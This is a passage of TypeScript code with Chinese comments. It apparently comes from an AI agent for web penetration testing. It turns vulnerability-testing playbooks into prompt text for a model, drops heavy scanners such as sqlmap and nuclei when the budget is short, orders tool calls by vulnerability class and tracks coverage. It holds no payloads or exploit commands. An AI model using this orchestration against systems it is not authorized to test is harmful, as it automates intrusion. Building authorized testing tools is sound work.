    `- ${playbook.id}（优先级 ${playbook.priority}｜${playbook.title}｜时间盒 ${Math.round(playbook.timebox_sec / 60)} 分钟）：`
    + `步骤 ${playbook.steps.map(step => `${step.tool}[${step.id}|${layerTag(stepLayer(step))}]`).join(" → ")}；`
      + `确认条件 ${playbook.confirm.must_show}；放弃条件 ${playbook.stop.join("；")}`
      // 缺陷 6：交付物给模板（填空题），不给开放题。
      + (playbook.deliverables_template?.length ? `；deliverables 照抄这套键：${playbook.deliverables_template.join(", ")}` : ""),
  ).join("\n");
  // 图模式打法：显式渲染 next / 条件 / 并发度，避免模型把它当线性 1→2→3 走。
  const graphs = orderedPlaybooks()
    .filter(playbook => playbook.steps.some(step => step.next?.length || step.when || step.concurrency))
    .map(playbook => {
      const nodes = playbook.steps.map(step => {
        const label = `${step.id}(${step.tool}|${layerTag(stepLayer(step))})${step.concurrency ? `×${step.concurrency}` : ""}${step.state_out ? ` ⇒${step.state_out}` : ""}`;
        const edges = step.next?.length ? ` → ${step.next.join(" | ")}` : " →（终点）";
        const cond = step.when ? ` ［条件：${step.when}］` : "";
        return `    ${label}${edges}${cond}`;
      }).join("\n");
      return `图模式打法 ${playbook.id}：按 next 走，可以分叉，不要当成线性 1→2→3。\n${nodes}`;
    }).join("\n\n");
  return graphs ? `${linear}\n\n${graphs}` : linear;
}

/** 单个 playbook 的详细步骤，确认前用 evidence_queries 不需要，靠提示词即可。 */
export function playbookGuide(id: string, options: { fast?: boolean } = {}): string {
  const playbook = playbookById(id);
  if (!playbook) return `未知 playbook：${id}。可用：${PLAYBOOK_IDS.join("、")}`;
  const plan = options.fast ? degradedPlan(playbook) : { steps: playbook.steps, confirm: playbook.confirm.evidence, skipped: [] as string[] };
  return [
    `# ${playbook.title}（${playbook.id}｜优先级 ${playbook.priority}）`,
    `适用：${playbook.when.join("；")}`,
    "步骤：",
    ...plan.steps.map((step, index) => `${index + 1}. [${step.id}] ${step.tool} —— ${step.purpose}${step.expect ? `（期望：${step.expect}）` : ""}${step.input ? ` 输入：${JSON.stringify(step.input)}` : ""}`),
    `确认：${plan.confirm.map(id => `[${id}]`).join(" + ")} 必须体现：${playbook.confirm.must_show}`,
    ...(plan.skipped.length ? [`本次降级跳过（预算不足）：${plan.skipped.join("、")}；不要把这些步骤的证据当作结案前提。`] : []),
    `放弃：${playbook.stop.join("；")}`,
    `报告要点：${playbook.report.join("；")}`,
  ].join("\n");
}

/**
 * 快速模式（预算降级）下这条打法还剩什么。
 *
 * 重型扫描器（sqlmap / nuclei / katana / ffuf 类）在墙钟或权重不够时一律摘掉：
 * 它们动辄吃掉 300 秒和 3–5 点权重，还会把"只差最后一步"的结论拖到超时之后。
 * 确认条件同步收窄到轻量步骤能给出的证据，否则任务永远达不到 completed。
 */
export function degradedPlan(playbook: Playbook): { steps: PlaybookStep[]; confirm: string[]; skipped: string[] } {
  const steps = playbook.steps.filter(step => !isHeavyTool(step.tool));
  const kept = new Set(steps.map(step => step.id));
  const confirm = playbook.confirm.evidence.filter(id => kept.has(id));
  const skipped = playbook.steps.filter(step => isHeavyTool(step.tool)).map(step => `${step.id}(${step.tool})`);
  return { steps: steps.length ? steps : playbook.steps.slice(0, 1), confirm: confirm.length ? confirm : playbook.confirm.evidence, skipped };
}
/** 任务/请求可绑定的 playbook 优先级；未知或不绑定时排到最后。 */
export function playbookPriority(id: string | undefined): number {
  const playbook = id ? playbookById(id) : undefined;
  return playbook ? playbook.priority : Number.MAX_SAFE_INTEGER;
}

/**
 * 工具批排序：同批请求按所属任务的 playbook 优先级执行（未授权 > 越权 > SQLi > … > XSS）。
 * 同一优先级内保持模型原本的顺序，避免把它的推理顺序打乱。
 */
export function sortRequestsByPlaybook<T extends { task_id?: string }>(
  requests: T[],
  playbookOf: (taskId: string) => string | undefined,
): T[] {
  return requests
    .map((request, index) => ({ request, index, priority: playbookPriority(playbookOf(String(request.task_id || ""))) }))
    .sort((a, b) => a.priority - b.priority || a.index - b.index)
    .map(item => item.request);
}

/** 该 playbook 里第一个使用此工具的步骤（用于把一次调用记到具体步骤上）。 */
export function stepForTool(id: string, tool: string): string | undefined {
  const playbook = playbookById(id);
  return playbook?.steps.find(step => step.tool === tool)?.id;
}

/** 覆盖账本里单个 playbook 的原始计数（存活在 checkpoint.playbook_runs）。 */
export type PlaybookRun = {
  calls?: number;
  ok?: number;
  failed?: number;
  steps?: Record<string, { calls?: number; ok?: number }>;
  last_error?: { step?: string; tool?: string; summary?: string; at?: number };
  last_at?: number;
};

export type PlaybookCoverage = {
  id: string;
  title: string;
  priority: number;
  tasks: number;
  tasks_completed: number;
  calls: number;
  ok: number;
  failed: number;
  steps_done: number;
  steps_total: number;
  /** 下一个该做的步骤（第一个没有成功调用的步骤）。 */
  next_step?: string;
  last_error?: string;
};

/**
 * 把 checkpoint 的 playbook_runs 汇总成人能直接读的覆盖表：
 * 哪条打法绑了几个任务、跑了几次、成功/失败多少、走到第几步、卡在哪个错误上。
 */
export function playbookCoverage(state: {
  tasks?: Record<string, { playbook?: string; status?: string }>;
  playbook_runs?: Record<string, PlaybookRun>;
}): PlaybookCoverage[] {
  const tasks = state.tasks || {};
  const runs = state.playbook_runs || {};
  const ids = new Set<string>([...Object.keys(runs)]);
  for (const task of Object.values(tasks)) {
    const id = playbookById(String(task.playbook || ""))?.id;
    if (id) ids.add(id);
  }
  const coverage: PlaybookCoverage[] = [];
  for (const id of ids) {
    const playbook = playbookById(id);
    if (!playbook) continue;
    const run = runs[id] || {};
    const bound = Object.values(tasks).filter(task => playbookById(String(task.playbook || ""))?.id === id);
    const steps = run.steps || {};
    const steps_done = playbook.steps.filter(step => Number(steps[step.id]?.ok || 0) > 0).length;
    coverage.push({
      id: playbook.id,
      title: playbook.title,
      priority: playbook.priority,
      tasks: bound.length,
      tasks_completed: bound.filter(task => task.status === "completed").length,
      calls: Number(run.calls || 0),
      ok: Number(run.ok || 0),
      failed: Number(run.failed || 0),
      steps_done,
      steps_total: playbook.steps.length,
      next_step: playbook.steps.find(step => Number(steps[step.id]?.ok || 0) === 0)?.id,
      last_error: run.last_error?.summary,
    });
  }
  return coverage.sort((a, b) => a.priority - b.priority);
}

/** 上下文里的一行摘要：一眼看出每条打法走到哪一步、卡在哪。 */
export function coverageSummary(coverage: PlaybookCoverage[], limit = 8): string {
  return coverage.slice(0, limit).map(item => {
    const parts = [`${item.id}(${item.title.slice(0, 10)})`, `任务 ${item.tasks_completed}/${item.tasks}`, `调用 ${item.calls}(ok ${item.ok}/fail ${item.failed})`, `步骤 ${item.steps_done}/${item.steps_total}`];
    if (item.next_step) parts.push(`下一步 ${item.next_step}`);
    if (item.last_error) parts.push(`最近失败 ${String(item.last_error).slice(0, 80)}`);
    return `- ${parts.join("｜")}`;
  }).join("\n");
}

/** 某 playbook 的交付物模板；未知 playbook 返回通用四项（避免空手让模型自由发挥）。 */
export function playbookDeliverables(id: string | undefined): string[] {
  const found = id ? PLAYBOOKS.find(playbook => playbook.id === id) : undefined;
  return found?.deliverables_template?.length
    ? [...found.deliverables_template]
    : ["target_endpoint_list", "baseline_and_variant_diff", "verdict", "evidence_ids"];
}